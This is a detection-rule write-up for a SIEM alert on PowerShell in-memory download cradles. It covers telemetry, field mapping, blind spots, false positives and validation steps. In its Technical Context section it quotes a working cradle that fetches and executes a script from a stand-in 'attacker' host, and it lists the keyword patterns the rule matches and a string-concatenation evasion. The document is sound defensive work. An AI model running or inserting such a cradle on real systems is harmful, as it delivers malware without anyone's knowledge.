# ADS: Suspicious PowerShell In-Memory Download Cradle

**Rule ID:** 7f3a1c2e-5b4d-4e8f-9a1b-2c3d4e5f6a7b
**Owner:** Emanuel Walker
**Last reviewed:** 2026-09-14
**Status:** experimental

## Goal

Detect the moment a Windows endpoint uses PowerShell to pull a payload from a non-approved URL and execute it in memory. The goal is to catch stage-two delivery before persistence or lateral movement starts.

## Categorization

- ATT&CK Technique: T1059.001 (Command and Scripting Interpreter: PowerShell)
- ATT&CK Technique: T1105 (Ingress Tool Transfer)
- Kill Chain Phase: Delivery, Installation
- Priority: High

## Strategy Abstract

The rule looks at process creation events for `powershell.exe` or `pwsh.exe`. It inspects the command line for one of six string patterns that are characteristic of download-and-execute behavior. These are the patterns a defender sees in the wild roughly 90% of the time when a malicious actor stages PowerShell payloads: `DownloadString`, `DownloadFile`, `Invoke-WebRequest`, `IEX (`, `Invoke-Expression`, and `Net.WebClient`.

Any match against those strings fires the rule, unless the command line contains a URL pointing at the enterprise's internal artifact server. The filter is explicit rather than regex-based so new internal hosts have to be added by hand after review.

## Technical Context

PowerShell cradles work because PowerShell exposes the full .NET networking stack. A single line like `IEX (New-Object Net.WebClient).DownloadString('https://attacker/payload.ps1')` fetches and executes a script without ever writing to disk. Disk-based AV cannot see it. Script Block Logging (Event ID 4104) captures the deobfuscated content, but the process creation event (Event ID 4688 or Sysmon Event ID 1) is where the command line first appears. We detect at process creation because it is the earliest signal.

**Required telemetry:**
- Windows Event ID 4688 with command line auditing enabled, OR
- Sysmon Event ID 1

**Field mapping (Elastic Common Schema):**
- `process.name`
- `process.command_line`
- `process.parent.name`
- `host.name`
- `user.name`

## Blind Spots and Assumptions

- The rule does not decode base64-encoded `-EncodedCommand` payloads. A separate decoder rule handles that case.
- The rule assumes command line auditing is enabled on all in-scope hosts. Hosts without 4688 command line or Sysmon are invisible to it.
- An attacker who compromises the internal artifact server bypasses this rule. That host is in the filter block. Mitigation lives in the artifact server's own authentication logs.
- Obfuscated calls using string concatenation (`'Download' + 'String'`) will evade the string match. We accept this tradeoff because detection would require executing the command line in a sandbox, which is out of scope at process-creation time.

## False Positives

- **Enterprise configuration management agents** pulling signed PowerShell modules from `internal-artifacts.corp.local` or `repo.internal.corp.local`. Filtered by URL. Confirmed as the root cause of a historical 10,000-alert incident.
- **Red team engagements.** Rare, legitimate. Suppress at the SIEM for the engagement window only. Do not add to the rule filter.
- **Developer workstations installing PowerShell Gallery modules.** `Install-Module` uses `Invoke-WebRequest` under the hood against `www.powershellgallery.com`. If the environment allows this, add the gallery URL to the filter block. Default is to alert and let the SOC triage.

## Validation

1. Run the atomic test at `code/tests/atomic_tests/T1059_001_powershell_download.yml`. The rule must match every event in the file.
2. Run the benign fixture at `code/tests/benign/benign_backup_tool.yml`. The rule must not match any event.
3. On a lab host, execute `powershell.exe -Command "(New-Object Net.WebClient).DownloadString('https://example.com/benign.txt')"` and confirm the alert fires in the SIEM within 60 seconds.
4. Spot-check 24 hours of production alerts weekly for the first month. Document any new false positive classes and update this ADS.

## Priority

**High.** PowerShell cradles are commodity attacker tradecraft and the single most common delivery pattern seen in incident response. A missed alert here typically precedes persistence establishment within minutes. A high-fidelity rule on this technique justifies waking an on-call analyst.
